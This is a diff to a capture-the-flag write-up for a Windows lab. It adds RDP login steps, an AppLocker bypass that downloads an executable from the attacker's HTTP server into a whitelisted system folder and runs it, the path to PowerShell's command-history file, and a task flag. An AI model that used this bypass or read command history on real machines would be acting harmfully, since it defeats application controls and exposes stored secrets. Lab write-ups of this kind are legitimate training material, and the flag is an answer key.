@@ -22,6 +22,14 @@ Deploy the windows machine, you will be able to control this in your browser. Ho
 Username: `corp\dark`  
 Password: `_QuejVudId6`
 
+![task1-IP](./images/task1-IP.png)
+
+```
+xfreerdp /u:dark /p:_QuejVudId6 /d:corp /v:$IP +clipboard /cert-ignore
+```
+
+![task1-rdp](./images/task1-rdp.png)
+
 ## Task 2 - Bypassing Applocker
 
 ![task2-logo](./images/task2-logo.png)
@@ -38,9 +46,42 @@ If AppLocker is configured with default AppLocker rules, we can bypass it by pla
 
 * Go ahead and use PowerShell to download an executable of your choice locally, place it in the whitelisted directory and execute it.
 
+	* Create C program `hello.c` to print word `Hello World..!!!` and compile to file name `hello.exe`
+	
+		```
+		#include<stdio.h>
+
+		int main() {
+  		printf("Hello World..!!!");
+  		return 0;
+		}
+		```
+
+		![task2-hello1](./images/task2-hello1.png)
+
+		```
+		x86_64-w64-mingw32-gcc hello.c -o hello.exe
+		```
+
+		![task2-hello2](./images/task2-hello2.png)
+
+	* Create simple HTTP server on our machine, transfer file `hello.exe` to Host target in the whitelisted directory and execute it
+	
+		![task2-http](./images/task2-http.png)
+
+		```
+		Invoke-WebRequest -Uri 'http://10.17.127.223:8000/hello.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\hello.exe'
+		```
+
+		![task2-hello3](./images/task2-hello3.png)
+
 Just like Linux bash, Windows Powershell saves all previous commands into a file called **ConsoleHost_history**. This is located at `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
 * Access the file and obtain the flag.
+	
+	`flag{a12a41b5f8111327690f836e9b302f0b}`
+	
+	![task2-flag](./images/task2-flag.png)
 
 ## Task 3 - Kerberoasting
 
